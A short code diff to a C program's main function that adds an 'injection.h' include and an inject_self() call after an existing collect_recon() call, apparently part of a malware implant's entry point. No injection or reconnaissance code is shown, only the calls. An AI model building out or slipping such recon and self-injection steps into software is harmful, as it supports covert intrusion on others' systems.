@@ -1,6 +1,7 @@
 #include <stdio.h>
 #include "config.h"
 #include "recon.h"
+#include "injection.h"
 
 int main(VOID)
 
@@ -11,6 +12,7 @@ int main(VOID)
 
 	collect_recon();
 
+	inject_self();
 
 
 	return 0;
